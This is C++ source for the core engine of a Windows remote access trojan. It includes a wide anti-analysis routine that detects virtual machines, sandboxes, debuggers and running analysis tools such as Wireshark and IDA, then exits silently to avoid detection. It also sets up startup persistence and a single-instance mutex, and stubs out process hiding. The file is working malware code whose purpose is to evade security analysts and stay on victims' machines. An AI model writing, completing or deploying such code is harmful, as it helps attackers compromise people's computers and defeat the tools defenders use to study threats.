#include "rat_engine.h"
#include "../stealth/persistence.h"
//#include "../stealth/hide_process.h"
#include "../utils/logger.h"
#include <windows.h>
#include <tlhelp32.h>
#include <random>
#include <sstream>
#include <iomanip>
#include <chrono>
#include <algorithm>

RATEngine::RATEngine() : running(false) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 15);
    std::stringstream ss;
    for (int i = 0; i < 8; i++) ss << std::hex << dis(gen);
    client_id = ss.str();
    Logger::getInstance().log("RAT Engine initialized. ID: " + client_id);
}

RATEngine::~RATEngine() { stop(); }

void RATEngine::initialize_mutex() {
    HANDLE hMutex = CreateMutexA(NULL, FALSE, RATConfig::MUTEX_NAME.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        Logger::getInstance().log("Already running. Exiting.");
        exit(0);
    }
}

void RATEngine::setup_persistence() {
    PersistenceManager::getInstance().install(RATConfig::STARTUP_NAME);
    Logger::getInstance().log("Persistence established.");
}

void RATEngine::hide_from_task_manager() {
    // Process hiding requires a kernel driver — not implemented.
    // Kept as a no-op so the call site in start() still works.
    Logger::getInstance().log("Process hiding skipped (not implemented yet).");
}

bool RATEngine::start() {
    if (running.load()) return false;
    
    Logger::getInstance().log("Starting RAT Engine...");
    
    // Check for sandbox before doing anything
    if (CheckSandbox()) {
        Logger::getInstance().log("[!] Sandbox detected! Exiting silently...");
        // Sleep to avoid immediate detection
        Sleep(5000);
        return false;
    }
    
    initialize_mutex();
    setup_persistence();
    hide_from_task_manager();
    running.store(true);
    worker_threads.emplace_back(&RATEngine::heartbeat, this);
    Logger::getInstance().log("RAT Engine started.");
    return true;
}

void RATEngine::stop() {
    if (!running.load()) return;
    running.store(false);
    for (auto& thread : worker_threads) {
        if (thread.joinable()) thread.join();
    }
    worker_threads.clear();
    Logger::getInstance().log("RAT Engine stopped.");
}

void RATEngine::heartbeat() {
    while (running.load()) {
        Logger::getInstance().log("Heartbeat sent.");
        std::this_thread::sleep_for(std::chrono::milliseconds(RATConfig::HEARTBEAT_INTERVAL_MS));
    }
}

bool RATEngine::CheckSandbox() {
    Logger::getInstance().log("[*] Checking for sandbox/VM environment...");
    
    // 1. Check RAM (sandboxes often have low RAM)
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        // Less than 4GB RAM - likely a VM/sandbox
        if (memStatus.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) {
            Logger::getInstance().log("[!] Low RAM detected - possible sandbox");
            return true;
        }
    }
    
    // 2. Check CPU cores (sandboxes often have 1-2 cores)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        Logger::getInstance().log("[!] Low CPU cores detected - possible sandbox");
        return true;
    }
    
    // 3. Check for VM files/folders
    if (FileExists("C:\\Program Files\\VMware\\")) {
        Logger::getInstance().log("[!] VMware detected");
        return true;
    }
    if (FileExists("C:\\Program Files\\VirtualBox\\")) {
        Logger::getInstance().log("[!] VirtualBox detected");
        return true;
    }
    if (FileExists("C:\\Program Files\\Microsoft Virtual PC\\")) {
        Logger::getInstance().log("[!] Microsoft Virtual PC detected");
        return true;
    }
    if (FileExists("C:\\Program Files\\Hyper-V\\")) {
        Logger::getInstance().log("[!] Hyper-V detected");
        return true;
    }
    
    // 4. Check for analysis tools
    std::vector<std::string> analysis_tools = {
        "wireshark.exe", "procmon.exe", "procexp.exe",
        "ollydbg.exe", "x64dbg.exe", "dnSpy.exe",
        "IDA.exe", "ImmunityDebugger.exe",
        "ProcessHacker.exe", "pestudio.exe",
        "RegShot.exe", "Wireshark.exe",
        "Sysinternals.exe", "tcpview.exe"
    };
    
    for (const auto& tool : analysis_tools) {
        if (IsProcessRunning(tool)) {
            Logger::getInstance().log("[!] Analysis tool detected: " + tool);
            return true;
        }
    }
    
    // 5. Check for typical sandbox usernames
    char userName[256];
    DWORD size = sizeof(userName);
    if (GetUserNameA(userName, &size)) {
        std::string user = userName;
        std::vector<std::string> sandbox_users = {
            "sandbox", "malware", "virus", "test", 
            "user", "admin", "analyzer", "sandboxie",
            "virus", "malware", "sample", "analysis"
        };
        for (const auto& su : sandbox_users) {
            std::string lowerUser = user;
            std::transform(lowerUser.begin(), lowerUser.end(), lowerUser.begin(), ::tolower);
            if (lowerUser.find(su) != std::string::npos) {
                Logger::getInstance().log("[!] Sandbox username detected: " + user);
                return true;
            }
        }
    }
    
    // 6. Check for VM BIOS strings
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char biosData[1024];
        DWORD dataSize = sizeof(biosData);
        DWORD type;
        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, &type, (BYTE*)biosData, &dataSize) == ERROR_SUCCESS) {
            std::string bios = biosData;
            std::vector<std::string> vm_strings = {
                "VMware", "VirtualBox", "Microsoft", "QEMU",
                "Xen", "Parallels", "Innotek", "Oracle"
            };
            for (const auto& vm : vm_strings) {
                if (bios.find(vm) != std::string::npos) {
                    Logger::getInstance().log("[!] VM BIOS detected: " + bios);
                    RegCloseKey(hKey);
                    return true;
                }
            }
        }
        RegCloseKey(hKey);
    }
    
    // 7. Check for debugger
    if (IsDebuggerPresent()) {
        Logger::getInstance().log("[!] Debugger detected!");
        return true;
    }
    
    Logger::getInstance().log("[+] No sandbox/VM detected.");
    return false;
}

// Helper function: Check if a file/directory exists
bool RATEngine::FileExists(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES);
}

// Helper function: Check if a process is running
bool RATEngine::IsProcessRunning(const std::string& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    bool found = false;
    if (Process32First(snapshot, &pe)) {
        do {
            // Convert both to lowercase for case-insensitive comparison
            std::string currentProc = pe.szExeFile;
            std::string targetProc = processName;
            std::transform(currentProc.begin(), currentProc.end(), currentProc.begin(), ::tolower);
            std::transform(targetProc.begin(), targetProc.end(), targetProc.begin(), ::tolower);
            
            if (currentProc == targetProc) {
                found = true;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }
    
    CloseHandle(snapshot);
    return found;
}
